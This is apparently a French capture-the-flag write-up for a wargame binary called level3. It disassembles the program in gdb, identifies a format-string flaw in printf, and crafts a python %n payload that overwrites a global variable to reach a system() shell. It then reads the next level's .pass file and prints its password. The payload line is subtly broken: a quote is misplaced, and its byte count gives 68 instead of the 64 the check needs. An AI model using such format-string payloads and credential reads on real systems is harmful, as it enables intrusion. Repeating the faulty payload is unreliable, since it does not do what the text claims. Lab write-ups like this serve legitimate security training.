Nous sommes ici en presence d’un binaire level3. Utilisons gdb :
gdb level3
disas main
Dump of assembler code for function v:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler Dump
disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler Dump
En desassemblant le programme nous voyons la presence d’une fonction main et d;une fonction. Dans cette derniere nous voyons des appels aux fonctions fgets, printf, fwrite et system.
Lorsque nous souhaitons faire segfault le programme cela n’est pas possible car la fonction gets va effectivement s’arreter de lire quand la size du buffer - 1 sera atteinte pour terminer avec un ‘\0’ (size de 512 0x080484b6 <+18>:	movl   $0x200,0x4(%esp)).
Nous remarquons la presence d’un cmp qui va comparer la valeur de $eax a 64 (0x40). Essayons de set la valeur de $eax a 64 pour voir ce qu’il se passe ensuite sans jump directement a la fin de la fonction v.
set $eax=64
c
Continuing
Wait what?!
$
La fonction suit donc son cours normal et l’appel a la fonction systeme va executer /bin/bash pour ouvrir un terminal. Cependant nous n’avons pas les droit du level4 et donc il nous est impossible d’afficher le flag. Mais alors ou est donc la vulnerabilite ?

Avec la presence d'un call de la fonction printf nous pouvons nous dire que la vulnerabilite serait une vuln de type Format String. En effet en utilisant le formateur %n nous pouvons ecrire a une adresse en memoire. En regardant de plus pres la fonction v nous que nous mettons dans le registre eax la valeur de ce qu'il y a a l'adresse memoire 0x804988c

x/x 0x804988c
0x804988c <m>: 0x00000000
Il s'agit donc d'une varible m qui est nulle. Essayons donc d'ecrire 64 caractere dans la variqble m. 

python -c 'print("\x8c\x98\x04\x08: + "A" * 64 + "%4$n")' > /tmp/level3
cat /tmp/level3 - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
